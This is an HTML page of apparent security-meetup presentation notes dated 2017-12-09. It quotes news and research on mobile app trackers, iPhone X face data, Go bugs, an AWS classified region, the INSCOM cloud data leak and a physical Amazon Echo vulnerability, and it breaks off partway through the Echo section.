

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>11.35. 2017-12-09 Phone tracking, AWS leaks, macOS root, exim &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="11.36. 2017-12-02 Static websites, IME follow-up" href="20171202_presentation.html" />
    <link rel="prev" title="11.34. 2017-12-16 Mozilla Observatory" href="20171216_presentation.html" /> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="20180818_presentation.html">11.1. 2018-08-18 Links, flaws.cloud</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180811_presentation.html">11.2. 2018-08-11 Links, flaws.cloud</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180804_presentation.html">11.3. 2018-08-04 Links, AWS S3</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180728_presentation.html">11.4. 2018-07-28 Links, AWS VPC</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180721_presentation.html">11.5. 2018-07-21 Links, HTML vs HTTPS, AWS Training and Certification</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180714_presentation.html">11.6. 2018-07-14 Links, jq, and MoinMoin code execution</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180707_presentation.html">11.7. 2018-07-07 Links, cloud logging, PentesterLab SQLi II</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180630_presentation.html">11.8. 2018-06-30 Links, home routers, PentesterLab SQLi</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180623_presentation.html">11.9. 2018-06-23 Links, PentesterLab, AWS EC2</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180616_presentation.html">11.10. 2018-06-16 Links, VMs/Containers, and AES/SHA</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180609_presentation.html">11.11. 2018-06-09 Links, VMs/Containers, and Cryptography</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180602_presentation.html">11.12. 2018-06-02 Links, Containers, and Cryptography</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180526_presentation.html">11.13. 2018-05-26 Links, Containers, and Cryptography</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180519_presentation.html">11.14. 2018-05-19 Links, Containers, and Cryptography</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180512_presentation.html">11.15. 2018-05-12 Links, Containers, and Cryptography</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180505_presentation.html">11.16. 2018-05-05 Links, Containers, and Cryptography</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180428_presentation.html">11.17. 2018-04-28 Links, Containers, and Cryptography</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180421_presentation.html">11.18. 2018-04-21 Links, 2FA, and Cryptography</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180414_presentation.html">11.19. 2018-04-14 Links and Cryptography</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180407_presentation.html">11.20. 2018-04-07 Links, nmap, and Cryptography</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180331_presentation.html">11.21. 2018-03-31 Links, TLS 1.3, and Cryptography</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180303_presentation.html">11.22. 2018-03-03 Links, Cloud VMs, OpenSSL, Metasploit Framework</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180224_presentation.html">11.23. 2018-02-24 Links, Cloud VMs, Let’s Encrypt, Metasploit Framework</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180217_presentation.html">11.24. 2018-02-17 Links, Web frontend, and Malware C2</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180210_presentation.html">11.25. 2018-02-10 Links, memory issues, and WAF</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180203_presentation.html">11.26. 2018-02-03 Links and more ROP</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180127_presentation.html">11.27. 2018-01-27 Links and ROP</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180120_presentation.html">11.28. 2018-01-20 Links and yet more Meltdown/Spectre</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180113_presentation.html">11.29. 2018-01-13 Links and more Meltdown/Spectre</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170812_presentation.html">11.30. 2017-08-12 VRT, cryptography, TLS 1.3, Broadpwn, cURL, and phishing</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180106_presentation.html">11.31. 2018-01-06 Invisibly fingerprinting text, Samsung no-SOP, Meltdown/Spectre</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171230_presentation.html">11.32. 2017-12-30 gohttp, hardening C/C++, Linux waitid() exploit</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171223_presentation.html">11.33. 2017-12-23 Haven, Observatory, and Janus</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171216_presentation.html">11.34. 2017-12-16 Mozilla Observatory</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">11.35. 2017-12-09 Phone tracking, AWS leaks, macOS root, exim</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#links-and-updates-this-week">11.35.1. Links and updates this week</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#maker-s-schedule-vs-manager-s-schedule">11.35.1.1. Maker’s Schedule vs Manager’s Schedule</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-leak-test">11.35.1.2. DNS leak test</a></li>
<li class="toctree-l4"><a class="reference internal" href="#not-getting-hacked-update">11.35.1.3. Not getting hacked update</a></li>
<li class="toctree-l4"><a class="reference internal" href="#tracking-via-phone-apps">11.35.1.4. Tracking via phone apps</a></li>
<li class="toctree-l4"><a class="reference internal" href="#apple-sharing-your-face">11.35.1.5. Apple sharing your face</a></li>
<li class="toctree-l4"><a class="reference internal" href="#go-rust-git-and-mercurial">11.35.1.6. Go, Rust, Git, and  Mercurial</a></li>
<li class="toctree-l4"><a class="reference internal" href="#classified-aws">11.35.1.7. Classified AWS</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#exploits-this-week">11.35.2. Exploits this week</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#top-secret-nsa-and-army-data-leaked-online">11.35.2.1. Top Secret NSA and Army data leaked online</a></li>
<li class="toctree-l4"><a class="reference internal" href="#just-say-no-to-amazon-echo-google-home">11.35.2.2. Just say no to Amazon Echo, Google Home, …</a></li>
<li class="toctree-l4"><a class="reference internal" href="#macos-allows-login-as-root">11.35.2.3. macOS allows login as root</a></li>
<li class="toctree-l4"><a class="reference internal" href="#exim-rce-and-dos">11.35.2.4. Exim RCE and DoS</a></li>
<li class="toctree-l4"><a class="reference internal" href="#wordpress-sites-infected-with-keylogger">11.35.2.5. WordPress sites infected with keylogger</a></li>
<li class="toctree-l4"><a class="reference internal" href="#bypassing-av">11.35.2.6. Bypassing AV</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="20171202_presentation.html">11.36. 2017-12-02 Static websites, IME follow-up</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171125_presentation.html">11.37. 2017-11-25 Not getting hacked, keystrokes, tracking, Fancy Bear, Intel ME</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171118_presentation.html">11.38. 2017-11-18 Privacy, safe languages, Linux networking</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171111_presentation.html">11.39. 2017-11-11 PKP removal, exploits galore</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171104_presentation.html">11.40. 2017-11-04 Cloud providers other than AWS</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171028_presentation.html">11.41. 2017-10-28 IPv6 ULA, DHCPv6, /64 prefixes, Bad Rabbit</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171021_presentation.html">11.42. 2017-10-21 IPv6 addressing, KRACK, Infineon RSA</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171014_presentation.html">11.43. 2017-10-14 Firewalls, building vulnerable hosts</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171007_presentation.html">11.44. 2017-10-07 QEMU virtualization</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170930_presentation.html">11.45. 2017-09-30 virtualization and bridges</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170923_presentation.html">11.46. 2017-09-23 nftables</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170916_presentation.html">11.47. 2017-09-16 “VPN”</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170909_presentation.html">11.48. 2017-09-09 Adding IPv6 on the EdgeRouter Lite</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170826_presentation.html">11.49. 2017-08-26 Complexity, Cookies vs Tokens</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170819_presentation.html">11.50. 2017-08-19 Forcing HTTPS, HTTP forwarding</a></li>
<li class="toctree-l2"><a class="reference internal" href="http_headers.html">11.51. 2017-08-05 Attacking via HTTP Headers</a></li>
<li class="toctree-l2"><a class="reference internal" href="mitm.html">11.52. MitM Presentation</a></li>
</ul>
</li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_presentations.html">11. Pentest Presentations</a> &raquo;</li>
        
      <li>11.35. 2017-12-09 Phone tracking, AWS leaks, macOS root, exim</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/presentations/20171209_presentation.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="phone-tracking-aws-leaks-macos-root-exim">
<h1>11.35. 2017-12-09 Phone tracking, AWS leaks, macOS root, exim<a class="headerlink" href="#phone-tracking-aws-leaks-macos-root-exim" title="Permalink to this headline">¶</a></h1>
<div class="section" id="links-and-updates-this-week">
<h2>11.35.1. Links and updates this week<a class="headerlink" href="#links-and-updates-this-week" title="Permalink to this headline">¶</a></h2>
<div class="section" id="maker-s-schedule-vs-manager-s-schedule">
<h3>11.35.1.1. Maker’s Schedule vs Manager’s Schedule<a class="headerlink" href="#maker-s-schedule-vs-manager-s-schedule" title="Permalink to this headline">¶</a></h3>
<p>From <a class="reference external" href="http://www.paulgraham.com/makersschedule.html">Maker’s Schedule, Manager’s Schedule</a>:</p>
<blockquote>
<div><p>There are two types of schedule, which I’ll call the manager’s schedule and the maker’s schedule. The manager’s schedule is for bosses. It’s embodied in the traditional appointment book, with each day cut into one hour intervals. You can block off several hours for a single task if you need to, but by default you change what you’re doing every hour.</p>
<p>Most powerful people are on the manager’s schedule. It’s the schedule of command. But there’s another way of using time that’s common among people who make things, like programmers and writers. They generally prefer to use time in units of half a day at least. You can’t write or program well in units of an hour. That’s barely enough time to get started.</p>
<p>When you’re operating on the maker’s schedule, meetings are a disaster. A single meeting can blow a whole afternoon, by breaking it into two pieces each too small to do anything hard in.</p>
</div></blockquote>
</div>
<div class="section" id="dns-leak-test">
<h3>11.35.1.2. DNS leak test<a class="headerlink" href="#dns-leak-test" title="Permalink to this headline">¶</a></h3>
<p>See <a class="reference external" href="https://www.dnsleaktest.com/">DNS leak test.com</a> for information on testing for DNS leaks.</p>
<p>Of course any pentester should be able to run a network scan for DNS leaks.</p>
</div>
<div class="section" id="not-getting-hacked-update">
<h3>11.35.1.3. Not getting hacked update<a class="headerlink" href="#not-getting-hacked-update" title="Permalink to this headline">¶</a></h3>
<p><a class="reference internal" href="../study/not_getting_hacked.html#not-getting-hacked"><span class="std std-ref">Not getting hacked</span></a> was updated to reflect a link to <a class="reference external" href="https://www.belfercenter.org/cyberplaybook">Cybersecurity Campaign Playbook</a>.</p>
</div>
<div class="section" id="tracking-via-phone-apps">
<h3>11.35.1.4. Tracking via phone apps<a class="headerlink" href="#tracking-via-phone-apps" title="Permalink to this headline">¶</a></h3>
<p>From <a class="reference external" href="https://theintercept.com/2017/11/24/staggering-variety-of-clandestine-trackers-found-in-popular-android-apps/">Staggering Variety of Clandestine Trackers Found in Popular Android Apps</a>:</p>
<blockquote>
<div><p>Researchers at Yale Privacy Lab and French nonprofit Exodus Privacy have documented the proliferation of tracking software on smartphones, finding that weather, flashlight, ride-sharing, and dating apps, among others, are infested with dozens of different types of trackers collecting vast amounts of information to better target advertising.</p>
<p>Exodus security researchers <a class="reference external" href="https://exodus-privacy.eu.org/">identified 44 trackers in more than 300 apps</a> for Google’s Android smartphone operating system. The apps, collectively, have been downloaded billions of times. Yale Privacy Lab, within the university’s law school, is working to replicate the Exodus findings and has already <a class="reference external" href="https://privacylab.yale.edu/">released reports</a> on 25 of the trackers.</p>
<p>Yale Privacy Lab researchers have only been able to analyze Android apps but believe many of the trackers also exist on iOS, since companies often distribute for both platforms. To find trackers, the Exodus researchers built a custom auditing platform for Android apps, which searched through the apps for digital “signatures” distilled from known trackers.</p>
<p>Among the Android apps researchers identified were, with six or seven trackers each, dating apps Tinder and OkCupid, the Weather Channel app, and Super-Bright LED Flashlight; the app for digital music service Spotify, which embedded four trackers, including two from Google; ride-sharing service Uber, with three trackers; and Skype, Lyft, AccuWeather, and Microsoft Outlook.</p>
</div></blockquote>
<p>See <a class="reference external" href="https://exodus-privacy.eu.org/">Exodus Privacy</a> for an overview of the <a class="reference external" href="https://github.com/exodus-privacy/exodus">Exodus-Privacy/exodus</a> tool and the Exodus Privacy French non-profit organization. They have a <a class="reference external" href="https://joinmastodon.org/">Mastodon</a> (see <a class="reference external" href="https://en.wikipedia.org/wiki/Mastodon_(software)">Mastodon (software)</a>) presence at <a class="reference external" href="https://framapiaf.org/&#64;exodus">Exodus Privacy Mastodon</a> with a link to <a class="reference external" href="https://www.itworld.com/article/3239684/mobile-wireless/when-the-threats-get-weird-the-security-solutions-get-weirder.html">When the threats get weird, the security solutions get weirder</a>:</p>
<blockquote>
<div><p>Tracking is a real problem for mobile apps, and this problem is underappreciated in considerations around BYOD policies.</p>
<p>Yale University Law School’s Privacy Lab and the France-based nonprofit Exodus Privacy have <a class="reference external" href="https://github.com/YalePrivacyLab/tracker-profiles">documented</a> that more than 75% of the more than 300 Android apps they looked at contained trackers of one kind or another, which mostly exist for advertising, behavioral analytics or location tracking.</p>
<p>Most of that location tracking relies on accessing GPS information, which requires user opt-in. But now, researchers at Princeton University <a class="reference external" href="https://www.princeton.edu/news/2017/11/29/phones-vulnerable-location-tracking-even-when-gps-services">have demonstrated</a> a potential privacy breach by creating an app called PinMe, which harvests location information on a smartphone without using GPS information.</p>
<p>In general, our belief that turning off the location feature of phones protected us from location snoops has been invalidated.</p>
<p>In fact, many of our assumptions around security are being challenged by new facts. Take two-factor authentication, for example.</p>
<p>A report last month by Javelin Strategy &amp; Research claimed that current applications of multi-factor authentication are “being undermined.” Two- or multi-factor authentication is also underutilized by enterprises, with just over one-third using “two or more factors to secure access to their data and systems.”</p>
<p>So we can’t trust two-factor authentication like we used to, and even if we could it’s wildly underutilized.</p>
<p>But surely we can trust Apple devices, right? Apple has a sterling reputation for strong security. Or, I should say, “had” such a reputation.</p>
</div></blockquote>
<p>The Exodus tool was used by the <a class="reference external" href="https://privacylab.yale.edu/">Yale Privacy Lab</a> to create a report announced at <a class="reference external" href="https://privacylab.yale.edu/press">#BlackFriday Announcement from Privacy Lab</a>. The detailed report is at <a class="reference external" href="https://github.com/YalePrivacyLab/tracker-profiles">Yale Privacy Lab - Tracker Profiles</a>.</p>
<p>From the <a class="reference external" href="https://privacylab.yale.edu/press">#BlackFriday Announcement from Privacy Lab</a>:</p>
<blockquote>
<div>More than 75% of the 300+ apps analyzed by Exodus contain the signatures of trackers, though this data does not tell the whole story. There is an entire industry based upon these trackers, and apps identified as “clean” today may contain trackers that have not yet been identified. Tracker code may also be added by developers to new versions of apps in the future. The Exodus platform identifies trackers via signatures, like an anti-virus or spyware scanner, and thus can only detect trackers previously identified by researchers at the time of the scan.</div></blockquote>
<p>From the <a class="reference external" href="https://privacylab.yale.edu/surveillance-map">Yale Privacy Lab - Surveillance Map</a>:</p>
<blockquote>
<div>Yale Privacy Lab is calling for transparency and public discussion concerning the steadily-increasing surveillance in our streets and near our homes, workplaces, and schools. This map is a starting point for conversation and action, focusing on Greater New Haven.</div></blockquote>
</div>
<div class="section" id="apple-sharing-your-face">
<h3>11.35.1.5. Apple sharing your face<a class="headerlink" href="#apple-sharing-your-face" title="Permalink to this headline">¶</a></h3>
<p>From <a class="reference external" href="https://www.washingtonpost.com/news/the-switch/wp/2017/11/30/apple-is-sharing-your-face-with-apps-thats-a-new-privacy-worry/?utm_term=.bed39f7897ce">Apple is sharing your face with apps. That’s a new privacy worry.</a>:</p>
<blockquote>
<div><p>Beyond a photo, the iPhone X’s front sensors scan 30,000 points to make a 3D model of your face. That’s how the iPhone X unlocks and makes animations that might have once required a Hollywood studio.</p>
<p>Now that a phone can scan your mug, what else might apps want to do with it? They could track your expressions to judge if you’re depressed. They could guess your gender, race and even sexuality. They might combine your face with other data to observe you in stores—or walking down the street.</p>
<p>Apps aren’t doing most of these things, yet. But is Apple doing enough to stop it? After I pressed executives this week, Apple made at least one change—retroactively requiring an app tapping into face data to publish a privacy policy.</p>
<p>Apple’s face tech sets some good precedents—and some bad ones. It won praise for storing the face data it uses to unlock the iPhone X securely on the phone, instead of sending it to its servers over the Internet.</p>
<p>Less noticed was how the iPhone lets other apps now tap into two eerie views from the so-called TrueDepth camera. There’s a wireframe representation of your face and a live read-out of 52 unique micro-movements in your eyelids, mouth and other features. Apps can store that data on their own computers.</p>
<p>To see for yourself, use an iPhone X to download an app called MeasureKit. It exposes the face data Apple makes available. The app’s maker, Rinat Khanov, tells me he’s already planning to add a feature that lets you export a model of your face so you can 3D print a mini-me.</p>
<p>And Apple’s rules say developers can’t sell face data, use it to identify anonymous people or use it for advertising. They’re also required to have privacy policies.</p>
<p>The bigger concern: “How realistic is it to expect Apple to adequately police this data?” Georgetown’s Garvey told me. Apple might spot violations from big apps like Facebook, but what about gazillions of smaller ones?</p>
<p>Then there’s a permission problem. Apps are supposed to make clear why they’re accessing your face and seek “conspicuous consent,” according to Apple’s policies. But when it comes time for you to tap OK, you get a pop-up that asks to “access the camera.” It doesn’t say, “HEY, I’M NOW GOING TO MAP YOUR EVERY TWITCH.”</p>
</div></blockquote>
</div>
<div class="section" id="go-rust-git-and-mercurial">
<h3>11.35.1.6. Go, Rust, Git, and  Mercurial<a class="headerlink" href="#go-rust-git-and-mercurial" title="Permalink to this headline">¶</a></h3>
<p>Some follow-up on some topics we’ve talked about in the past: Git, Mercurial, Rust, and Go …</p>
<div class="section" id="id22">
<h4>11.35.1.6.1. Git<a class="headerlink" href="#id22" title="Permalink to this headline">¶</a></h4>
<p>Git is highly successful, even to the point that Microsoft is adapting Git: <a class="reference external" href="https://arstechnica.com/gadgets/2017/11/microsoft-and-github-team-up-to-take-git-virtual-file-system-to-macos-linux/">Microsoft and GitHub team up to take Git virtual file system to macOS, Linux</a>.</p>
<p>But git is hard, so take a look at <a class="reference external" href="http://think-like-a-git.net/">Think Like (a) Git - Git shouldn’t be so hard to learn</a>.</p>
</div>
<div class="section" id="mercurial">
<h4>11.35.1.6.2. Mercurial<a class="headerlink" href="#mercurial" title="Permalink to this headline">¶</a></h4>
<p>Facebook uses and is extending Mercurial:</p>
<ul class="simple">
<li><a class="reference external" href="https://code.facebook.com/posts/218678814984400/scaling-mercurial-at-facebook/">Scaling Mercurial at Facebook</a></li>
<li><a class="reference external" href="https://github.com/facebookexperimental/mononoke">facebookexperimental/mononoke</a> is a next-generation server for the <a class="reference external" href="https://www.mercurial-scm.org/">Mercurial source control system</a>, meant to scale up to accepting thousands of commits every hour across millions of files. It is primarily written in the <a class="reference external" href="https://www.rust-lang.org/en-US/">Rust programming language</a>.</li>
<li><a class="reference external" href="https://bitbucket.org/facebook/hg-experimental">Facebook hg-experimental</a> repository has some Python extensions written in Rust</li>
</ul>
</div>
<div class="section" id="rust">
<h4>11.35.1.6.3. Rust<a class="headerlink" href="#rust" title="Permalink to this headline">¶</a></h4>
<p>Which brings us to <a class="reference external" href="https://www.mercurial-scm.org/wiki/OxidationPlan#">Using Rust in Mercurial</a> illustrating another search for more secure coding by using Rust.</p>
<p>To learn Rust see the free book <a class="reference external" href="https://doc.rust-lang.org/stable/book/">The Rust Programming Language</a> and to play with Rust online see the <a class="reference external" href="https://play.rust-lang.org/">Rust Playground</a>.</p>
</div>
<div class="section" id="go-issues">
<h4>11.35.1.6.4. Go issues<a class="headerlink" href="#go-issues" title="Permalink to this headline">¶</a></h4>
<p>Regarding go, <a class="reference external" href="http://seclists.org/oss-sec/2017/q4/307">Go programming language invalid modular exponentiation result (Exp() in math/big pkg)</a> shows an error in Go:</p>
<blockquote>
<div>For an exponent of 1, big.Int.Exp returns the correct value only for a 0 recipient, and an off-by-one result for all pre-allocated recipients.</div></blockquote>
<p>And <a class="reference external" href="https://marcan.st/2017/12/debugging-an-evil-go-runtime-bug/">Debugging an evil Go runtime bug</a>:</p>
<blockquote>
<div><p>Go loves small stacks.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>TEXT runtime·walltime(SB),NOSPLIT,$16
        // Be careful. We&#39;re calling a function with gcc calling convention here.
        // We&#39;re guaranteed 128 bytes on entry, and we&#39;ve taken 16, and the
        // call uses another 8.
        // That leaves 104 for the gettime code to use. Hope that&#39;s enough!
</pre></div>
</div>
<p>Turns out 104 bytes aren’t enough for everybody. Certainly not for my kernel.</p>
<p>It’s worth pointing out that the vDSO specification makes no mention of maximum stack usage guarantees, so this is squarely Go’s fault for making invalid assumptions.</p>
</div></blockquote>
</div>
</div>
<div class="section" id="classified-aws">
<h3>11.35.1.7. Classified AWS<a class="headerlink" href="#classified-aws" title="Permalink to this headline">¶</a></h3>
<p>From <a class="reference external" href="https://aws.amazon.com/blogs/publicsector/announcing-the-new-aws-secret-region/">Announcing the New AWS Secret Region</a>:</p>
<blockquote>
<div>With the launch of this new Secret Region, AWS becomes the first and only commercial cloud provider to offer regions to serve government workloads across the full range of data classifications, including Unclassified, Sensitive, Secret, and Top Secret.</div></blockquote>
</div>
</div>
<div class="section" id="exploits-this-week">
<h2>11.35.2. Exploits this week<a class="headerlink" href="#exploits-this-week" title="Permalink to this headline">¶</a></h2>
<div class="section" id="top-secret-nsa-and-army-data-leaked-online">
<h3>11.35.2.1. Top Secret NSA and Army data leaked online<a class="headerlink" href="#top-secret-nsa-and-army-data-leaked-online" title="Permalink to this headline">¶</a></h3>
<p>From <a class="reference external" href="https://www.upguard.com/breaches/cloud-leak-inscom">Black Box, Red Disk: How Top Secret NSA and Army Data Leaked Online</a>:</p>
<blockquote>
<div><p>Critical data belonging to the United States <a class="reference external" href="https://www.inscom.army.mil/">Army Intelligence and Security Command (INSCOM)</a>, a joint US Army and National Security Agency (NSA) Defense Department command tasked with gathering intelligence for US military and political leaders, leaked onto the public internet, exposing internal data and virtual systems used for classified communications to anyone with an internet connection. With <a class="reference external" href="https://app.upguard.com/webscan?url=https%3A%2F%2Fwww.inscom.army.mil%2F">a middling CSTAR cyber risk score of 589 out of a maximum of 950</a>, INSCOM’s web presence provides troubling indications of gaps in their cybersecurity - exemplified by the presence of classified data within this publicly accessible data repository.</p>
<p>Among the most compelling downloadable assets revealed from within the exposed bucket is a virtual hard drive used for communications within secure federal IT environments, which, when opened, reveals classified data labeled <a class="reference external" href="http://www.spiegel.de/international/world/glossary-of-nsa-abbreviations-a-975930.html">NOFORN</a> - a restriction indicating a high level of sensitivity, prohibited from being disseminated even to foreign allies. The exposed data also reveals sensitive details concerning the Defense Department’s battlefield intelligence platform, <a class="reference external" href="http://asc.army.mil/web/portfolio-item/iews-dcgs-a/">the Distributed Common Ground System - Army (DCGS-A)</a> as well as <a class="reference external" href="https://nypost.com/2014/10/27/army-spent-5b-on-failed-technology-created-by-vets/">the platform’s troubled cloud auxiliary, codenamed “Red Disk.”</a></p>
<p>This cloud leak follows a number of previous Cyber Risk Team reports detailing Pentagon data exposures from within <a class="reference external" href="https://www.upguard.com/breaches/cloud-leak-centcom">the US Central Command, US Pacific Command</a>, and <a class="reference external" href="https://www.upguard.com/breaches/spy-games">the National Geospatial-Intelligence Agency</a>, a Defense Department agency tasked with acquiring and analyzing satellite imagery intelligence. Such continual and apparently accidental exposure of classified national security data to the wider internet is proof that even the most secretive corners of the IT landscape are not immune to the cyber risks befalling any enterprise operating at scale.</p>
</div></blockquote>
<p>Also see <a class="reference external" href="https://arstechnica.com/information-technology/2017/11/army-red-disk-intel-sharing-system-left-exposed-in-open-aws-data-store/">Researcher discovers classified Army intel app, data on open public AWS bucket</a>.</p>
</div>
<div class="section" id="just-say-no-to-amazon-echo-google-home">
<h3>11.35.2.2. Just say no to Amazon Echo, Google Home, …<a class="headerlink" href="#just-say-no-to-amazon-echo-google-home" title="Permalink to this headline">¶</a></h3>
<div class="section" id="alexa-are-you-listening">
<h4>11.35.2.2.1. Alexa, are you listening?<a class="headerlink" href="#alexa-are-you-listening" title="Permalink to this headline">¶</a></h4>
<p>From <a class="reference external" href="https://labs.mwrinfosecurity.com/blog/alexa-are-you-listening">Alexa, are you listening?</a>:</p>
<blockquote>
<div><p>The Amazon Echo is vulnerable to a physical attack that allows an attacker to gain a root shell on the underlying Linux operating system and install malware without leaving physical evidence of tampering. Such malware could grant an attacker persistent remote access to the device, steal customer authentication tokens, and the ability to stream live microphone audio to remote services without altering the functionality of the device.</p>
<p>This vulnerability is due to two hardware design choices:</p>
<ul class="simple">
<li>Exposed debug pads on the base of the device</li>
<li>Hardware configuration setting which allows the device to boot from an external SD Card</li>
</ul>
<p>This vulnerability has been confirmed on the 2015 and 2016 edition of the Amazon Echo however the 2017 edition is not vulnerable to this physical attack. The mitigation implemented by Amazon was to join the +3V input pad with the MOSI/CMD pad somewhere on the main board, this effectively disables SPI communications with an external SD Card, preventing external booting.</p>
</div></blockquote>
</div>
<div class="section" id="don-t-buy-anyone-an-echo">
<h4>11.35.2.2.2. Don’t Buy Anyone an Echo<a class="headerlink" href="#don-t-buy-anyone-an-echo" title="Permalink to this headline">¶</a></h4>
<p>From <a class="reference external" href="https://gizmodo.com/dont-buy-anyone-an-echo-1820981732">Don’t Buy Anyone an Echo</a>:</p>
<blockquote>
